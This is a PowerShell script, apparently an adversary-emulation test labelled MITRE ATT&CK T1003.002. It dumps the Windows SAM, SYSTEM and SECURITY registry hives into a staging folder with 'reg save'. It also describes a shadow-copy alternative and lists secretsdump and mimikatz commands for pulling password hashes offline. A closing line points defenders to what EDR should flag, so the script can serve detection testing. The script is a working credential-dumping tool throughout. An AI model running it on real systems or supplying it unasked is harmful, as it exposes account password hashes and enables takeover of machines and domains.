$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Credential Access - SAM/SYSTEM Registry Extraction..." -ForegroundColor Cyan

# T1003.002 - OS Credential Dumping: Security Account Manager
# Extracts SAM, SYSTEM, and SECURITY hives for offline credential extraction

Write-Host "[*] [T1003.002] SAM/SYSTEM/SECURITY registry hive extraction" -ForegroundColor Yellow
Write-Host "[!] Requires: Local Administrator privileges" -ForegroundColor Yellow

$dumpDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $dumpDir -Force | Out-Null

# Method 1: reg.exe save (most common)
Write-Host "`n[*] [T1003.002] Method 1: reg.exe save..."

Write-Host "    CMD: reg save HKLM\SAM $dumpDir\SAM"
reg save HKLM\SAM "$dumpDir\SAM" /y
if (Test-Path "$dumpDir\SAM") {
    Write-Host "    [+] SAM hive saved successfully" -ForegroundColor Green
} else {
    Write-Host "    [-] SAM save failed (requires admin)" -ForegroundColor Red
}

Write-Host "    CMD: reg save HKLM\SYSTEM $dumpDir\SYSTEM"
reg save HKLM\SYSTEM "$dumpDir\SYSTEM" /y
if (Test-Path "$dumpDir\SYSTEM") {
    Write-Host "    [+] SYSTEM hive saved successfully" -ForegroundColor Green
} else {
    Write-Host "    [-] SYSTEM save failed (requires admin)" -ForegroundColor Red
}

Write-Host "    CMD: reg save HKLM\SECURITY $dumpDir\SECURITY"
reg save HKLM\SECURITY "$dumpDir\SECURITY" /y
if (Test-Path "$dumpDir\SECURITY") {
    Write-Host "    [+] SECURITY hive saved successfully" -ForegroundColor Green
} else {
    Write-Host "    [-] SECURITY save failed (requires admin)" -ForegroundColor Red
}

# Method 2: Volume Shadow Copy (alternative)
Write-Host "`n[*] Method 2: Volume Shadow Copy extraction..."
Write-Host "    CMD: vssadmin create shadow /for=C:"
Write-Host "    Copy from: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"
Write-Host "    [!] Shadow copy method used when registry is locked" -ForegroundColor Yellow

# Summary
Write-Host "`n[*] Extracted hive summary:"
Get-ChildItem $dumpDir -Filter "SAM","SYSTEM","SECURITY" -ErrorAction SilentlyContinue | ForEach-Object {
    $size = [math]::Round($_.Length / 1KB, 2)
    Write-Host "    [+] $($_.Name) - $size KB" -ForegroundColor Green
}

Write-Host "`n[*] Offline extraction commands:" -ForegroundColor Cyan
Write-Host "    secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL"
Write-Host "    mimikatz: lsadump::sam /sam:SAM /system:SYSTEM"

Write-Host "`n[+] SAM/SYSTEM Registry Extraction Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: reg.exe save on SAM/SYSTEM, registry hive access" -ForegroundColor Yellow
